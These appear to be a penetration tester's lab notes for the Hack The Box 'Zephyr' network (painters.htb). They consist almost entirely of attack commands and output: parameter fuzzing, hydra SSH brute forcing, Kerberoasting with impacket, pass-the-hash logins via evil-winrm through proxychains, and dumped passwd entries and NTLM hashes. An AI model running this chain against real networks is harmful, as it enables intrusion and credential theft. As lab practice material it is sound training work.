# Zephyr

{% code overflow="wrap" %}
```powershell
# IP Subnet
10.10.110.0/24
# Entry Host
10.10.110.35
painters.htb
# Email Addresses
info@painters.htb
# Users
Thomas Bishop
James Ray
Toby Harlington

# mail Server
mail.painters.htb, IP Address:192.168.110.51
# Certificate Authority
zsm-ZPH-SVRCA01-CA
# Attempt to fuzz parameters. 
ffuf -u 'https://painters.htb/views/service.php?FUZZ=1' -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fw 5846
# Attempted SSH bruteforce to 4481 of 43033197
# Restore with hydra -R
hydra -F -L users.txt -P /usr/share/wordlists/rockyou.txt -t 4 $ip ssh -vV -I -u

https://painters.htb/administration/logout
https://painters.htb/administration/login
https://painters.htb/administration/users
https://painters.htb/administration/dashboard
https://painters.htb/administration/applications
https://painters.htb/administration/application/download
https://painters.htb/administration/application/delete

# Credentials
PAINTERS\riley
P@ssw0rd
# Privesc
SSH_CONNECTION=10.10.14.3 36916 192.168.110.51 22
Potentially Vulnerable to CVE-2022-2588

blake:x:1002:1002:Blake Morris,,,:/home/blake:/bin/bash                                                                                                                                                               
daniel:x:1001:1001:Daniel Morris,,,:/home/daniel:/bin/bash                                                                                                                                                            
matt:x:1000:1000:Matt Fisher:/home/matt:/bin/bash                                                                                                                                                                     
riley:x:1003:1003:Riley Smart,,,:/home/riley:/bin/bash                                                                                                                                                                
root:x:0:0:root:/root:/bin/bash

# Find the Domain Controller
sudo proxychains nmap -sT -Pn -n 192.168.110.0/24 -p 389
# Confirm the linux account works with the Domain Controller
proxychains crackmapexec smb 192.168.110.55 -u riley -p 'P@ssw0rd'
# Run bloodhound
bloodhound-python -d painters.htb -u riley -p 'P@ssw0rd' -gc dc.painters.htb -c all -ns 192.168.110.55

# nmap scans
## 192.168.110.52
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

# shares DC
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 



# Kerberoastable
blake
web_svc
proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 192.168.110.55 painters.htb/riley -outputfile hashes.kerberoast

```
{% endcode %}

## Disclosure

```bash
# Connect with evil-winrm
proxychains evil-winrm -i 192.168.110.52 -u web_svc -p '!QAZ1qaz'

# Hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6ee87fa6593a4798fe651f5f5a4e663e:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
James:1001:aad3b435b51404eeaad3b435b51404ee:8af1903d3c80d3552a84b6ba296db2ea:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


James:8af1903d3c80d3552a84b6ba296db2ea
```

## Persistence (PNT-SVRBPA)

```bash
# Use James hash from previous host
proxychains evil-winrm -i 192.168.110.53 -u james -H 8af1903d3c80d3552a84b6ba296db2ea

# Hash dump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:23ea5ff648e7ec7dcd1bfef8e9434099:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
James:1001:aad3b435b51404eeaad3b435b51404ee:8af1903d3c80d3552a84b6ba296db2ea:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```
